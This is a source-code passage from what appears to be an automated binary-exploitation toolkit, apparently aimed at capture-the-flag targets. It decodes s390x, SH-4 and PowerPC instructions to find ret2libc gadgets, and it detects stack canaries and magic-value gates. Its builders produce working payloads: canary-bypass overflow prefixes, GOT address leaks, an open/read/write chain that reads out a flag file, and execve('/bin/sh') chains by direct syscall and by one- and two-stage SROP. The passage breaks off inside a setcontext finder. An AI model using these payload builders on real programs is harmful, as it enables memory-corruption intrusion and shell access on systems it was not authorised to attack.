        va = _find_exec(data, enc.to_bytes(4, "little"), 4)
        if va is not None:
            out.append({"insn": "jr", "reg": f"r{n}", "va": va})
    return out


# ---------------------------------------------------------------- s390x (IBM Z) ret2libc gadgets
def _s390_decode(data: bytes, p: int):
    """Decode the s390x (z/Architecture) instructions a ret2libc caller cares about, at byte `p`.
    Returns (op, a, b, ilen): op in {lgr, basr, br} or None; for `lgr` a=rd/b=rs, for basr/br b=the
    branch-target register. `ilen` is the instruction length, always valid so the stream can advance
    (s390 is variable-length: the top two bits of the first byte give 2/4/4/6). Big-endian; host
    objdump cannot disassemble s390x. Encodings verified against binutils gas/objdump."""
    b0 = data[p]
    ilen = (2, 4, 4, 6)[b0 >> 6]
    if b0 == 0xB9:                                        # RRE (4 bytes); B904 == lgr rd, rs
        if p + 4 <= len(data) and data[p + 1] == 0x04 and data[p + 2] == 0x00:
            return ("lgr", data[p + 3] >> 4, data[p + 3] & 0xF, 4)
        return (None, 0, 0, 4)
    if b0 == 0x0D and p + 2 <= len(data):                # RR; basr rA, rB -> call rB (save ret in rA)
        return ("basr", data[p + 1] >> 4, data[p + 1] & 0xF, 2)
    if b0 == 0x07 and p + 2 <= len(data) and (data[p + 1] >> 4) == 0xF:
        return ("br", 0, data[p + 1] & 0xF, 2)           # bcr 15, rB == br rB (unconditional)
    return (None, 0, 0, ilen)


def find_s390x_r2libc_gadgets(data: bytes) -> dict:
    """s390x caller gadgets: `lgr %r2, %rS ; (basr %r?,%rB | br %rB)` -- set the first argument (r2)
    from a controllable GPR, then branch to another. The vulnerable frame's own `lmg` epilogue is the
    loader (it restores r9..r15 off the overflow); WHICH offset controls which GPR is discovered at
    runtime by a tagged detonation (as for PowerPC64), so this returns only the callers. Returns
    {"callers":[{va,src,br}]} (register numbers). Big-endian; host objdump cannot disassemble s390x."""
    callers = []
    for off, sz, va, flags in _loads(data):
        if not (flags & 1):
            continue
        p, end = off, off + sz
        while p < end:
            op, a, b, ln = _s390_decode(data, p)
            if op == "lgr" and a == 2:                   # lgr %r2, %rS
                n = _s390_decode(data, p + ln) if p + ln < end else (None, 0, 0, 0)
                if n[0] in ("basr", "br"):
                    callers.append({"va": va + (p - off), "src": b, "br": n[2]})
            p += ln or 2
    return {"callers": callers}


def find_br_gadgets_s390x(data: bytes):
    """s390x `br %rX` (== bcr 15,%rX) gadgets as [{insn, reg, va}] -- branch to the address in rX, the
    s390x `jmp <reg>` for reaching injected shellcode on an execstack when rX points at the buffer."""
    out = []
    for off, sz, va, flags in _loads(data):
        if not (flags & 1):
            continue
        p, end = off, off + sz
        while p < end:
            o = _s390_decode(data, p)
            if o[0] == "br" and o[2] != 0:               # br %rX (rX != 0)
                out.append({"insn": f"br %r{o[2]}", "reg": f"r{o[2]}", "va": va + (p - off)})
            p += o[3] or 2
    return out


# ---------------------------------------------------------------- SuperH SH-4 ret2libc gadgets
# SH-4 callee-saved GPRs are r8..r14 (r15 is the stack pointer) -- the registers a function epilogue
# restores from its frame with `mov.l @r15+,rN`, hence the ones a stack overflow of that frame can
# control. r4..r7 (the argument registers) are caller-saved, so the epilogue does NOT restore r4:
# the first argument must be set by a caller GADGET, not by the loader frame as on s390x/ppc.
_SH_CALLEE = set(range(8, 15))


def _sh_decode(w: int):
    """Decode the SuperH SH-4 instructions a ret2libc caller cares about, from one 16-bit word.
    Returns (op, a, b) or None: `mov` a=Rn(dest)/b=Rm(src); `jsr`/`jmp` a=Rn(branch-target reg)/b=0.
    SH-4 is fixed 16-bit; host objdump CAN disassemble it, but the decode is tiny and keeps the finder
    self-contained + endian-parameterized. Encodings (verified against sh4-linux-gnu-objdump bytes,
    e.g. `a3 64`=`mov r10,r4`, `0b 4a`=`jsr @r10`): mov Rm,Rn = 0110nnnnmmmm0011 (0x6..3);
    jsr @Rn = 0100nnnn00001011 (0x4n0b); jmp @Rn = 0100nnnn00101011 (0x4n2b)."""
    if (w & 0xF00F) == 0x6003:                           # mov Rm, Rn
        return ("mov", (w >> 8) & 0xF, (w >> 4) & 0xF)
    if (w & 0xF0FF) == 0x400B:                           # jsr @Rn (call; saves return in PR)
        return ("jsr", (w >> 8) & 0xF, 0)
    if (w & 0xF0FF) == 0x402B:                           # jmp @Rn (branch; leaves PR untouched)
        return ("jmp", (w >> 8) & 0xF, 0)
    return None


def find_sh4_r2libc_gadgets(data: bytes, endian: str = "little") -> dict:
    """SuperH SH-4 caller gadgets for ret2libc: a register branch `(jsr|jmp) @rB` whose DELAY SLOT is
    `mov rS,r4` -- so entering at the branch sets the first argument r4=rS and then jumps to rB.

    SH-4 branches are delayed: the instruction after `(jsr|jmp) @rB` executes before control transfers.
    A gadget `jsr @rB ; mov rS,r4` therefore sets r4 from rS and calls rB in one shot. The vulnerable
    frame's own epilogue (`mov.l @r15+,rN` restoring r8..r14, then `lds.l @r15+,pr ; rts`) is the
    loader: it reloads the callee-saved regs AND PR off the overflow, so pointing PR at this gadget
    with rS=&"/bin/sh" and rB=&system gives system("/bin/sh"). WHICH buffer offset controls PR and each
    GPR is discovered at runtime by a tagged detonation (as for s390x/ppc), so this returns only the
    callers. Only src/br in the callee-saved set (r8..r14) are kept -- a volatile register cannot be
    controlled by the overflow. Returns {"callers":[{va,src,br}]} (register numbers). `endian` is the
    target's byte order (sh4 little, sh4eb big)."""
    order = "big" if endian == "big" else "little"
    callers = []
    for off, sz, va, flags in _loads(data):
        if not (flags & 1):
            continue
        p, end = off, off + sz
        while p + 4 <= end:                              # need the branch AND its delay slot
            br = _sh_decode(int.from_bytes(data[p:p + 2], order))
            if br and br[0] in ("jsr", "jmp") and br[1] in _SH_CALLEE:
                dly = _sh_decode(int.from_bytes(data[p + 2:p + 4], order))
                if dly and dly[0] == "mov" and dly[1] == 4 and dly[2] in _SH_CALLEE \
                        and dly[2] != br[1]:             # mov rS,r4 in the delay slot, S != branch reg
                    callers.append({"va": va + (p - off), "src": dly[2], "br": br[1]})
            p += 2
    return {"callers": callers}


def find_br_gadgets_sh4(data: bytes, endian: str = "little"):
    """SuperH SH-4 `jmp @rN` gadgets as [{insn, reg, va}] -- the SH `jmp <reg>` (branch to the address
    in rN), the no-leak way to reach injected shellcode on an execstack when rN points at the input
    buffer. jmp @Rn = 0100nnnn00101011 = 0x402B | (n << 8); 16-bit, 2-byte aligned. r15 is the stack
    pointer, skipped. SH-4 branches are DELAYED (the instruction after `jmp @rN` runs before control
    transfers), but a real `jmp @rN` in the binary already carries a benign delay slot, and the
    detonation + negative control confirm the hit. `endian` is the target byte order (sh4 little,
    sh4eb big)."""
    order = "big" if endian == "big" else "little"
    out = []
    for n in range(15):                                  # r0..r14; r15 = sp
        enc = 0x402B | (n << 8)
        va = _find_exec(data, enc.to_bytes(2, order), 2)
        if va is not None:
            out.append({"insn": "jmp", "reg": f"r{n}", "va": va})
    return out


# ---------------------------------------------------------------- PowerPC64 (ELFv2) ret2libc gadgets
# PPC64 callee-saved GPRs are r14..r31 -- the registers a function epilogue restores from its frame,
# hence the ones a stack overflow of that frame can control.
_PPC_CALLEE = set(range(14, 32))


def _ppc_words(data: bytes, endian: str = "little"):
    """(va, word) for every aligned 4-byte PowerPC instruction in executable segments. PPC is
    fixed-width; the 32-bit instruction word is read in the TARGET's byte order (`endian`) -- a
    big-endian image (ppc / ppc64 ELFv1) stores each instruction big-endian, little-endian ELFv2
    stores it little-endian. The instruction BITFIELDS are then decoded the same way either way."""
    order = "big" if endian == "big" else "little"
    for off, sz, va, flags in _loads(data):
        if not (flags & 1):
            continue
        for p in range(off, off + (sz & ~3) - 3, 4):
            yield va + (p - off), int.from_bytes(data[p:p + 4], order)


def _ppc_is_mtctr(w):
    return (w & 0xFC1FFFFF) == 0x7C0903A6                 # mtctr rS (mtspr 9)


def _ppc_is_mr(w):                                       # mr rA, rX  ==  or rA, rX, rX (rS==rB)
    return (((w >> 26) & 0x3F) == 31 and ((w >> 1) & 0x3FF) == 444 and (w & 1) == 0
            and ((w >> 21) & 0x1F) == ((w >> 11) & 0x1F))


def _ppc_is_mr_r3(w):                                    # mr r3, rX -- destination rA (bits 20:16) is 3
    return _ppc_is_mr(w) and ((w >> 16) & 0x1F) == 3


_PPC_NOP = 0x60000000                                    # ori r0, r0, 0


def find_ppc64_r2libc_gadgets(data: bytes, endian: str = "little", clean=None) -> dict:
    """PowerPC ret2libc caller gadgets, for ELFv2 (ppc64le) AND ELFv1 (ppc / ppc64 big-endian): a
    CLEAN tail `... mtctr rC ; mr r3, rT ; [mr r12,* | nop]* ; bctr[l]` with rC and rT both
    callee-saved (r14..r31). Pure byte decode -- host objdump cannot disassemble PPC; `endian` is the
    target's byte order.

    The overflow controls the saved Link Register (the function's return target) and, through the
    function's own GPR save/restore, the callee-saved registers. Point the saved LR at the gadget's
    START with rC=&system and rT=&"/bin/sh": `mtctr` loads CTR=&system, `mr r3` sets the first
    argument, `bctr` branches to system("/bin/sh"). (On ELFv2 the gadget's `mr r12,rC` doubles as the
    global-entry TOC setup; on ELFv1 r2 is the single static TOC, left untouched.) Returns
    {"callers":[{va, ctr, arg}]} with va the gadget START and ctr/arg the GPRs to load.

    `clean` (default: on for big-endian, off for the shipped ppc64le path) controls selection:

    * LOOSE (ppc64le, unchanged): take the first callee `mtctr` and first callee `mr r3` within the 8
      instructions before `bctr`. The ELFv2 fixtures' gadgets happen not to clobber r3/CTR after the
      setters, so this is enough and is left exactly as shipped.
    * CLEAN (ppc / ppc64 big-endian): additionally require the first CTR writer and the first r3
      writer seen scanning back from `bctr` to be the controllable `mtctr`/`mr r3` themselves, and
      every other instruction in that tail to be a harmless `mr`/`nop`. A real function body on ppc32
      often has an arithmetic/load insn between `mr r3` and `bctr` that CLOBBERS r3 before the call;
      CLEAN rejects such a site (the caller still confirms each candidate live, so a stray false
      positive costs only one detonation)."""
    if clean is None:
        clean = (endian == "big")
    words = list(_ppc_words(data, endian))
    callers = []
    for i, (va, w) in enumerate(words):
        if w not in (0x4E800420, 0x4E800421):            # bctr / bctrl
            continue
        ctr = arg = None
        start = va
        for k in range(i - 1, max(-1, i - 8), -1):
            wk = words[k][1]
            if wk in (0x4E800420, 0x4E800421):
                break
            if _ppc_is_mtctr(wk) and ctr is None:
                r = (wk >> 21) & 0x1F
                if r in _PPC_CALLEE:
                    ctr = r; start = min(start, words[k][0])
                elif clean:
                    break                                # closest CTR writer is not controllable
            elif _ppc_is_mr_r3(wk) and arg is None:
                r = (wk >> 21) & 0x1F
                if r in _PPC_CALLEE:
                    arg = r; start = min(start, words[k][0])
                elif clean:
                    break                                # closest r3 writer is not controllable
            elif clean and not (_ppc_is_mr(wk) or wk == _PPC_NOP):
                break                                    # a non-mr/nop insn could clobber r3/CTR
            if clean and ctr is not None and arg is not None:
                break
        if ctr is not None and arg is not None and ctr != arg:
            callers.append({"va": start, "ctr": ctr, "arg": arg})
    return {"callers": callers}


def find_mtctr_bctr_gadgets_ppc(data: bytes, endian: str = "little"):
    """PowerPC `mtctr rX ; bctr[l]` gadgets as [{insn, reg, va}] -- branch to the address in rX, the
    PPC `jmp <reg>` for reaching injected shellcode on an execstack when rX points at the input
    buffer. Pure byte decode; `endian` is the target's byte order."""
    words = list(_ppc_words(data, endian))
    out = []
    for i in range(len(words) - 1):
        va, w = words[i]
        if _ppc_is_mtctr(w) and words[i + 1][1] in (0x4E800420, 0x4E800421):
            n = (w >> 21) & 0x1F
            out.append({"insn": f"mtctr r{n}; bctr", "reg": f"r{n}", "va": va})
    return out


def find_magic_gates(data: bytes):
    """Find a stack LOCAL checked against a magic constant that gates a branch (jeeves'
    `if (local==0x1337bab3)` -> read+print the flag). A stack overflow that writes IMM32 into the
    local satisfies the check without touching the return address. Two code shapes are recognised,
    each followed by an equality jump (short or near):

      * direct compare  -- `cmp dword [rbp-X], IMM32`  (81 7d <disp8> <imm32>) / `[rsp+X]`
      * load-then-compare -- `mov eax, [rbp-X]; cmp eax, IMM32`  (8b 45 <disp8> ... 3d <imm32>)

    the second is what gcc/clang emit for a `volatile` local or at higher optimisation. Returns
    [{va, magic, disp}] where `disp` is the local's signed rbp displacement (negative == a local
    below rbp, the overflowable case)."""
    out = []
    seen = set()
    for off, sz, va, fl in _loads(data):
        if not (fl & 1):                                 # executable segments only
            continue
        seg = data[off:off + sz]
        # (a) direct memory compare against an immediate.
        # Each pattern keeps its own next position and is re-searched only once consumed:
        # re-finding BOTH from every hit rescanned the rest of the segment for the rarer one at
        # every hit of the other -- quadratic on a large binary.
        j = seg.find(b"\x81\x7d")                       # cmp dword [rbp+disp8], imm32
        k = seg.find(b"\x81\x7c\x24")                   # cmp dword [rsp+disp8], imm32
        while j >= 0 or k >= 0:
            hit = min(x for x in (j, k) if x >= 0)
            if hit == j:
                j = seg.find(b"\x81\x7d", hit + 1)
            if hit == k:
                k = seg.find(b"\x81\x7c\x24", hit + 1)
            rbp = seg[hit:hit + 2] == b"\x81\x7d"
            base = hit + (3 if rbp else 4)
            if base + 4 > len(seg):
                continue
            disp = _s8(seg[base - 1])
            magic = int.from_bytes(seg[base:base + 4], "little")
            # A local sits BELOW rbp (negative disp) but ABOVE rsp (non-negative disp): requiring
            # disp < 0 of the rsp form dropped every frame-pointer-less (-O1+) gate.
            if magic > 0x1000 and (disp < 0 if rbp else disp >= 0) and _jcc_at(seg, base + 4):
                key = (va + hit, magic)
                if key not in seen:
                    seen.add(key)
                    out.append({"va": va + hit, "magic": magic, "disp": disp, "width": 4,
                                "base": "rbp" if rbp else "rsp"})
        # (b) load a local into eax, then compare eax to an immediate: mov eax,[rbp+disp8] (8b 45
        #     <disp8>) followed within a few bytes by cmp eax,imm32 (3d <imm32>) then a jcc.
        i = 0
        while True:
            m = seg.find(b"\x8b\x45", i)                 # mov eax, dword [rbp+disp8]
            if m < 0 or m + 3 > len(seg):
                break
            i = m + 1
            disp = _s8(seg[m + 2])
            if disp >= 0:
                continue
            c = seg.find(b"\x3d", m + 3, m + 12)         # cmp eax, imm32, near the load
            if c < 0 or c + 5 > len(seg):
                continue
            magic = int.from_bytes(seg[c + 1:c + 5], "little")
            if magic > 0x1000 and _jcc_at(seg, c + 5):
                key = (va + m, magic)
                if key not in seen:
                    seen.add(key)
                    out.append({"va": va + m, "magic": magic, "disp": disp, "width": 4})
        # (c) 64-bit magic: `mov r64,[rbp/rsp-X]; movabs rreg, imm64; cmp r64,r64; jcc`. gcc emits
        #     this for a 64-bit local (`unsigned long key == 0x...`); the dword shapes above never
        #     match it, so a whole class of magic gate was invisible and reached no L3 overwrite.
        i = 0
        while True:
            mv = _find_movabs(seg, i)                     # REX.W B8+r : movabs r64, imm64
            if mv < 0 or mv + 10 > len(seg):
                break
            i = mv + 1
            imm = int.from_bytes(seg[mv + 2:mv + 10], "little")
            if imm <= 0xFFFFFFFF:                         # a 32-bit value uses the dword shapes
                continue
            disp = _local_load_disp(seg, mv - 12, mv)     # the local loaded just before the movabs
            if disp is None or disp >= 0:
                continue
            c = seg.find(b"\x48\x39", mv + 10, mv + 16)   # cmp r64, r64 (REX.W 39 /r) just after
            if c < 0 or not _jcc_at(seg, c + 3):
                continue
            key = (va + mv, imm)
            if key not in seen:
                seen.add(key)
                out.append({"va": va + mv, "magic": imm, "disp": disp, "width": 8})
    # rbp-relative gates first (stable): they carry a frame-computed seed and were the only form
    # recognised before, so the rsp form only ever adds sweeps AFTER them, never delays them.
    out.sort(key=lambda g: g.get("base") == "rsp")
    return out


def find_canary(vals):
    """A leaked stack canary from a set of leaked values (a %p dump / an over-read). glibc's canary
    is a full-width random word with its LOW BYTE forced to 0x00 (so a string read stops before it
    leaks accidentally), so it reads as: low byte 0x00, the rest non-zero and high-entropy, and it
    is NOT a canonical pointer (not the 0x5.../0x7f... ranges of PIE code / stack / libc). Returns
    the first value matching that shape, or None. A caller that knows the exact leak slot should
    pass that value directly rather than rely on this heuristic."""
    for v in vals:
        v = int(v)
        if v & 0xFF:                                     # low byte must be the 0x00 terminator
            continue
        if v >> 8 == 0:                                  # not zero
            continue
        if v < 0x1000000000000:                          # a canary fills the top bytes; small -> no
            continue
        if 0x550000000000 <= v <= 0x5FFFFFFFFFFF:        # looks like a PIE code pointer
            continue
        if 0x7F0000000000 <= v <= 0x7FFFFFFFFFFF:        # looks like a stack / libc / mmap pointer
            continue
        return v
    return None


def build_canary_prefix(canary_offset: int, canary: int, ret_offset: int) -> bytes:
    """The overflow filler that reaches the saved return address WITHOUT tripping the stack
    protector: pad to the canary slot, write the leaked canary back unchanged, then pad across the
    saved frame pointer to the return slot. The caller appends the ROP chain / target address."""
    body = bytearray(b"A" * canary_offset)
    body += struct.pack("<Q", canary & 0xFFFFFFFFFFFFFFFF)
    gap = ret_offset - canary_offset - 8
    body += b"B" * max(0, gap)
    return bytes(body)


def resolve_libc_base(leaked: int, sym_offset: int):
    """libc load base from a leaked runtime address of a symbol at `sym_offset`. A real libc base
    is page-aligned; anything else means the leak was not the pointer we assumed, so return None
    rather than a bogus base that would send every resolved address into the weeds."""
    base = leaked - sym_offset
    return base if base > 0 and base % 0x1000 == 0 else None


def build_leak_puts(offset: int, *, pop_rdi: int, got: int, puts_plt: int, ret_to: int,
                    length: int = 0, ret_gadget=None) -> bytes:
    """Stage 1: cyclic filler, then puts(GOT) -- prints the libc address stored at `got` as raw
    little-endian bytes -- and returns to `ret_to` (the vulnerable function / main) so the program
    loops back and reads stage 2 over the same connection."""
    body = bytearray(_cyclic(offset))
    chain = [pop_rdi, got, puts_plt]
    if ret_gadget:
        chain.append(ret_gadget)                         # keep rsp 16-aligned for the re-entry
    chain.append(ret_to)
    for word in chain:
        body += struct.pack("<Q", word & 0xFFFFFFFFFFFFFFFF)
    if len(body) < length:
        body += b"C" * (length - len(body))
    return bytes(body)


def build_leak_write(offset: int, *, pop_rdi: int, pop_rsi: int, pop_rdx: int, got: int,
                     write_plt: int, ret_to: int, length: int = 0, ret_gadget=None) -> bytes:
    """Stage 1 via write(1, GOT, 8): emits EXACTLY 8 raw bytes of the libc address at `got` -- no
    format interpretation and no NUL/newline truncation, so it is robust where the target exposes
    write() but not puts() (printf-as-string leaks are fragile: a 0x0a or 0x25 byte in the address
    truncates or mis-parses them). Needs clean pop rsi / pop rdx gadgets; returns to `ret_to`."""
    body = bytearray(_cyclic(offset))
    chain = [pop_rdi, 1, pop_rsi, got, pop_rdx, 8, write_plt]
    if ret_gadget:
        chain.append(ret_gadget)
    chain.append(ret_to)
    for word in chain:
        body += struct.pack("<Q", word & 0xFFFFFFFFFFFFFFFF)
    if len(body) < length:
        body += b"C" * (length - len(body))
    return bytes(body)


def _cyclic(n):
    from .primitive import cyclic
    return cyclic(n)


# --------------------------------------------------------------------------- SROP (x86-64)
# Sigreturn-oriented programming: a single `syscall` with rax=15 (rt_sigreturn) restores the ENTIRE
# register set from a frame the attacker placed on the stack. It turns a stack overflow + one
# syscall gadget into arbitrary register control -- enough to call execve("/bin/sh",0,0) without any
# pop-gadgets. Used for static/no-PIE targets where a ret2libc/ret2csu chain isn't available.

_SC = b"\x0f\x05"                                   # syscall
_SC_RET = b"\x0f\x05\xc3"                           # syscall ; ret
_POP_RAX = b"\x58\xc3"                              # pop rax ; ret

# byte offset (in 8-byte words) of each register inside the amd64 rt_sigframe the kernel reads at
# rsp when rt_sigreturn runs. Matches the Linux sigcontext layout (== pwntools SigreturnFrame).
_SIGFRAME_WORDS = {
    "r8": 5, "r9": 6, "r10": 7, "r11": 8, "r12": 9, "r13": 10, "r14": 11, "r15": 12,
    "rdi": 13, "rsi": 14, "rbp": 15, "rbx": 16, "rdx": 17, "rax": 18, "rcx": 19,
    "rsp": 20, "rip": 21,
}
_CSGSFS_WORD = 23                                   # cs=0x33 for 64-bit user code


def find_syscall(data: bytes):
    """VA of a `syscall ; ret` gadget (preferred) or a bare `syscall`, or None."""
    return _find_exec(data, _SC_RET) or _find_exec(data, _SC)


def find_pop_rax(data: bytes):
    """VA of a `pop rax ; ret` gadget, or None (rax must then be set another way)."""
    return _find_exec(data, _POP_RAX)


_MOV_EAX_15 = b"\xb8\x0f\x00\x00\x00\xc3"           # mov eax, 15 ; ret
_MOV_RAX_15 = b"\x48\xc7\xc0\x0f\x00\x00\x00\xc3"   # mov rax, 15 ; ret


def find_rax15(data: bytes):
    """A gadget that puts 15 (rt_sigreturn) into rax for SROP, as (vaddr, kind): `pop rax;ret`
    (kind 'pop' -- the 15 is the NEXT stack word) or `mov eax/rax,15;ret` (kind 'mov' -- no stack
    word). Generalises the SROP bootstrap beyond `pop rax`, which some no-pop-rax binaries lack."""
    a = find_pop_rax(data)
    if a:
        return (a, "pop")
    a = _find_exec(data, _MOV_EAX_15) or _find_exec(data, _MOV_RAX_15)
    if a:
        return (a, "mov")
    return None


def find_writable(data: bytes, need: int = 16):
    """(vaddr, size) of a SAFE fixed writable address to plant bytes on a no-PIE target: an address
    in the .bss (the uninitialized tail of a writable PT_LOAD, past p_filesz) rather than the
    segment START -- the start holds .dynamic/.got/.data, and a read() that overruns them corrupts
    the loader state and crashes before execve. Falls back to the segment start only if no .bss."""
    if len(data) < 64 or data[:4] != b"\x7fELF" or data[4] != 2:
        return None
    endc = "<" if data[5] == 1 else ">"
    e_phoff = struct.unpack_from(endc + "Q", data, 32)[0]
    e_phentsize, e_phnum = struct.unpack_from(endc + "HH", data, 54)
    fallback = None
    for i in range(e_phnum):
        o = e_phoff + i * e_phentsize
        if o + e_phentsize > len(data):
            break
        p_type, p_flags = struct.unpack_from(endc + "II", data, o)
        if p_type != 1 or not (p_flags & 2):            # PT_LOAD, writable (p_flags bit1 = W)
            continue
        p_vaddr = struct.unpack_from(endc + "Q", data, o + 16)[0]
        p_filesz = struct.unpack_from(endc + "Q", data, o + 32)[0]
        p_memsz = struct.unpack_from(endc + "Q", data, o + 40)[0]
        bss = (p_vaddr + p_filesz + 0xF) & ~0xF         # start of .bss, 16-aligned
        room = (p_vaddr + p_memsz) - bss
        if room >= max(need, 16):
            return (bss, room)                          # uninitialized -> safe to clobber
        if fallback is None and p_memsz >= need:
            fallback = (p_vaddr, p_memsz)
    return fallback


def sigreturn_frame(*, rip, rsp=0, rdi=0, rsi=0, rdx=0, rax=0, rbp=0, rbx=0, rcx=0,
                    r8=0, r9=0, r10=0, r11=0, r12=0, r13=0, r14=0, r15=0) -> bytes:
    """The 248-byte amd64 rt_sigframe restored by rt_sigreturn(rax=15). Set the registers the
    controlled `syscall` at `rip` will then use (e.g. rax=59, rdi=&"/bin/sh" for execve)."""
    words = [0] * 31                                # 31 qwords = 0xF8 bytes
    vals = dict(rip=rip, rsp=rsp, rdi=rdi, rsi=rsi, rdx=rdx, rax=rax, rbp=rbp, rbx=rbx, rcx=rcx,
                r8=r8, r9=r9, r10=r10, r11=r11, r12=r12, r13=r13, r14=r14, r15=r15)
    for reg, w in _SIGFRAME_WORDS.items():
        words[w] = vals[reg]
    words[_CSGSFS_WORD] = 0x33
    return b"".join(struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF) for v in words)


def build_orw_rop(offset: int, *, pop_rdi: int, pop_rsi: int, pop_rdx: int, open_fn: int,
                  read_fn: int, write_fn: int, scratch: int, path_len: int = 24,
                  read_len: int = 256, ret_gadget=None) -> bytes:
    """open/read/write ROP: read the flag PATH from stdin into `scratch`, open() it, read the file
    into `scratch`, write() it to stdout. The go-to finisher when seccomp blocks execve -- it
    discloses a file instead of spawning a shell. Assumes the opened fd is 3 (a fresh process holds
    0/1/2 open), the standard ORW convention. `open_fn/read_fn/write_fn` and the pop gadgets + scratch
    are RUNTIME addresses (libc fns relocated by the leaked base). A `ret_gadget` is interleaved
    before each call to keep rsp 16-aligned for libc's movaps."""
    q = lambda v: struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)      # noqa: E731
    pad = q(ret_gadget) if ret_gadget else b""

    def call(fn, *args):
        regs = (pop_rdi, pop_rsi, pop_rdx)
        c = b"".join(q(g) + q(a) for g, a in zip(regs, args))
        return c + pad + q(fn)

    body = bytearray(_cyclic(offset))
    body += call(read_fn, 0, scratch, path_len)      # read(0, scratch, path_len) <- path sent next
    body += call(open_fn, scratch, 0)                # open(scratch, O_RDONLY) -> fd 3
    body += call(read_fn, 3, scratch, read_len)      # read(3, scratch, read_len)
    body += call(write_fn, 1, scratch, read_len)     # write(1, scratch, read_len)
    return bytes(body)


def execve_feasible(data: bytes):
    """What a direct execve("/bin/sh",0,0) syscall ROP needs, and what this binary supplies. Unlike
    SROP it sets the argument registers with plain pop gadgets, so it wants pop rdi/rsi/rdx, a way
    to put 59 in rax (pop rax), a `syscall` gadget and a "/bin/sh" string. The natural chain for a
    binary that imports no `system` but has these gadgets + the string (common in static/CTF
    binaries)."""
    return {
        "syscall": find_syscall(data),
        "pop_rdi": find_gadget(data, "pop_rdi"),
        "pop_rsi": find_gadget(data, "pop_rsi"),
        "pop_rdx": find_gadget(data, "pop_rdx"),
        "pop_rax": find_pop_rax(data),
        "binsh": find_string(data, b"/bin/sh"),
    }


def build_execve_syscall(offset: int, *, binsh: int, syscall: int, pop_rdi: int, pop_rsi: int,
                         pop_rdx: int, pop_rax: int, length: int = 0, ret_gadget=None) -> bytes:
    """cyclic filler, then rdi=&"/bin/sh" ; rsi=0 ; rdx=0 ; rax=59 ; syscall -> execve("/bin/sh",0,0).
    A no-PIE binary uses fixed addresses; a PIE caller relocates each argument by the leaked base."""
    body = bytearray(_cyclic(offset))
    chain = []
    if ret_gadget:
        chain.append(ret_gadget)
    chain += [pop_rdi, binsh, pop_rsi, 0, pop_rdx, 0, pop_rax, 59, syscall]
    for word in chain:
        body += struct.pack("<Q", word & 0xFFFFFFFFFFFFFFFF)
    if len(body) < length:
        body += b"C" * (length - len(body))
    return bytes(body)


def srop_feasible(data: bytes):
    """What an SROP execve chain needs, and which pieces this binary supplies. Returns a dict the
    exploit stage uses to decide: {syscall, pop_rax, writable, binsh}. `syscall` is required; a
    writable segment (to plant "/bin/sh") and a way to set rax=15 are the other gatekeepers."""
    return {
        "syscall": find_syscall(data),
        "pop_rax": find_pop_rax(data),
        "rax15": find_rax15(data),                      # (addr, 'pop'|'mov') -- generalises pop_rax
        "writable": find_writable(data),
        "binsh": find_string(data, b"/bin/sh"),
    }


def build_srop_execve(offset: int, *, syscall: int, binsh: int, length: int,
                      pop_rax: int, rsp: int = 0) -> bytes:
    """One-shot SROP execve("/bin/sh",0,0) for a binary WITH a `pop rax; ret` gadget and "/bin/sh"
    already at `binsh`: overflow -> pop rax;15 -> syscall(rt_sigreturn) -> frame(execve).
    The `syscall` gadget doubles as the frame's rip so the restored rax=59 runs execve."""
    body = bytearray(_cyclic(offset))
    body += struct.pack("<Q", pop_rax)
    body += struct.pack("<Q", 15)                   # rt_sigreturn
    body += struct.pack("<Q", syscall)              # executes rt_sigreturn
    body += sigreturn_frame(rip=syscall, rax=59, rdi=binsh, rsi=0, rdx=0, rsp=rsp or binsh)
    if len(body) < length:
        body += b"C" * (length - len(body))
    return bytes(body)


def build_srop_execve_plant(offset: int, *, syscall: int, rax15, writable: int,
                            count: int = 0x200, binsh_off: int = 0x120):
    """Two-STAGE SROP execve for a binary that has a writable segment and a rax=15 gadget but NO
    "/bin/sh" string in the image: PLANT the string via a read, then execve it. No leak needed on a
    no-PIE target because `writable` is a fixed address. `rax15` is (vaddr, kind) from find_rax15:
    a `pop rax;ret` (the 15 follows on the stack) or a `mov eax/rax,15;ret` (no stack word).

      stage1 (to the overflowing read): pad(offset) -> set rax=15 -> syscall(rt_sigreturn) ->
        frame{rax=0(read), rdi=0, rsi=writable, rdx=count, rip=syscall, rsp=writable}
        -- so after the read the `ret` pivots rsp INTO the freshly-read stage2.
      stage2 (to that read): set rax=15 -> syscall(rt_sigreturn) ->
        frame{rax=59(execve), rdi=writable+binsh_off, rip=syscall} ... "/bin/sh\\0" at +binsh_off.

    Returns (stage1, stage2): send stage1 to the overflow, then stage2 to the planted read.
    """
    gaddr, kind = rax15

    def _set_rax15():                                # put 15 in rax, then the syscall gadget
        if kind == "pop":                            # pop rax; ret -- 15 is the next stack word
            return struct.pack("<Q", gaddr) + struct.pack("<Q", 15) + struct.pack("<Q", syscall)
        return struct.pack("<Q", gaddr) + struct.pack("<Q", syscall)   # mov eax,15;ret -- no word
    binsh = writable + binsh_off
    stage2 = _set_rax15() + sigreturn_frame(rip=syscall, rax=59, rdi=binsh, rsi=0, rdx=0,
                                            rsp=writable)
    stage2 = stage2.ljust(binsh_off, b"\x00") + b"/bin/sh\x00"
    frame1 = sigreturn_frame(rip=syscall, rax=0, rdi=0, rsi=writable, rdx=count, rsp=writable)
    stage1 = bytes(_cyclic(offset)) + _set_rax15() + frame1
    return stage1, stage2


# --- setcontext: every register from one structure ----------------------------------------------
#: `mov <reg>, [rdx+disp]` encodings. REX.W (0x48) selects rax..rdi, REX.W|REX.R (0x4c) r8..r15;
#: opcode 0x8b; modrm rm=010 (rdx) with mod=01 (disp8) or mod=10 (disp32). Parsed rather than
#: matched against a fixed table because WHICH register sits at WHICH context offset is a property
#: of the glibc in front of us -- and the entry point moved once already (glibc 2.29 switched the
#: structure pointer from rdi to rdx, which is why the famous offset is "+61" on one version and
#: something else on the next).
_SETCTX_REGS = ("rax", "rcx", "rdx", "rbx", "rsp", "rbp", "rsi", "rdi")


def find_setcontext(libc_data: bytes) -> dict:
    """`setcontext`'s usable entry and the context offset each register is loaded from, or {}.

    Returns `{"sym", "entry", "fields": {reg: offset}, "rip_at"}` -- all libc-relative, so a
    leaked base relocates them. The ENTRY is deliberately not `setcontext` itself: the function
    starts with a `rt_sigprocmask` syscall and then `fldenv [rcx]` / `ldmxcsr [rdx+...]`, which
    fault unless the context carries a valid FPU environment. Entering at the first
    `mov rsp, [rdx+...]` skips both and is what every use of this technique actually jumps to.

